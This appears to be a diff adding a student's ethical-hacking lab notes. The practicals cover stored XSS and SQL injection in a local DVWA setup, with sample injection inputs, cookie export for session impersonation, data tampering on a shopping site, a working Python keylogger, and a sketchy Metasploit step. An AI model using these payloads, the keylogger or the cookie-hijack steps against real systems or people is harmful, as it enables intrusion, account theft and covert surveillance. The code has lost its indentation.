@@ -1,1 +1,82 @@
+Practical – 6  >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
+Aim: Simulate persistent cross-site scripting attack.  
+Steps:  
+1. Extract the DVWA zip file.  
+2. Copy the folder and paste it in Drive C: > xampp > htdocs  
+3. Rename the file as DVWA.  
+4. Go in the config file and rename the file as config.inc.php  
+5. Open chrome and search localhost/DVWA.  
+6. Click on create/reset database. The database will be created. Click on login.  
+7. Username = “Admin” and Password = “password”. Click on login. 
+8. Click on DVWA security and set the security to low.  
+9. Click on XSS (Stored) write the script and click on sign guestbook. The script will be executed 
+whenever the page is reloaded. 
+
+
+
+
+Practical 7 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+AIM: Session impersonation using Firefox and Tamper Data add-on  
+A] Session Impersonation  
+STEPS  
+1. Open FireFox  
+2. Go to Tools > Addons > Extension  
+3. Search and install EditThisCookie or Cookie Import/Export or any other Cookie tool  
+4. Then Click on Cookie extension to get cookie  
+5. Open a Website and Login and then click on export cookie 
+Logout from the webpage once the cookie got exported  
+Paste the cookie in the tool which you have exported and click on green tick 
+Tamper DATA add-on  
+1. Open FireFox  
+2. Go to Tools > Addons > Extension  
+3. Search and install Temper Data  
+Select a website for tempering data e.g(razorba)  
+Select any item to but  
+Then Click to add cart  
+Then Click on tool for tempering Data 
+Then Start tempering the data  
+Here you go 
+
+
+Practical 8 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+AIM: Perform SQL injection attack.  
+Step 1 : Open XAMPP and start apache and mysql.  
+Step 2 : Go to web browser and enter site localhost/phpmyadmin. 
+Step 3 : Create database with name sql_db.  
+Step 4 : Go to site localhost/sql_injection/setup.php and click on create/reset database. 
+Step 5 : Go to login.php and login using admin and .  
+Step 6 : Opens the home page.  
+Step 7 : Go to security setting option in left and set security level low.  
+Step 8 : Click on SQL injection option in left.  
+Step 9 : Write "1" in text box and click on submit. 
+Step 10 : Write "a' or ''='" in text box and click on submit.  
+Step 11 : Write "1=1" in text box and click on submit.  
+Step 12 : Write "1*" in text box and click on submit. 
+
+
+Practical 9 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+Aim: - Create a simple keylogger using python 
+Code: - 
+from pynput.keyboard import Key, Listener 
+import logging 
+# if no name it gets into an empty string 
+log_dir = "" 
+# This is a basic logging function 
+logging.basicConfig(filename=(log_dir+"key_log.txt"), level=logging.DEBUG, 
+format='%(asctime)s:%(message)s:') 
+# This is from the library 
+def on_press(key): 
+logging.info(str(key)) 
+# This says, listener is on 
+with Listener(on_press=on_press) as listener: 
+listener.join() 
+Practical 10 
+AIM: Using Metasploit to exploit  
+Steps: 
+Download and open metasploit  
+Use exploit to attack the host  
+Create the exploit and add the exploit to the victim’s PC
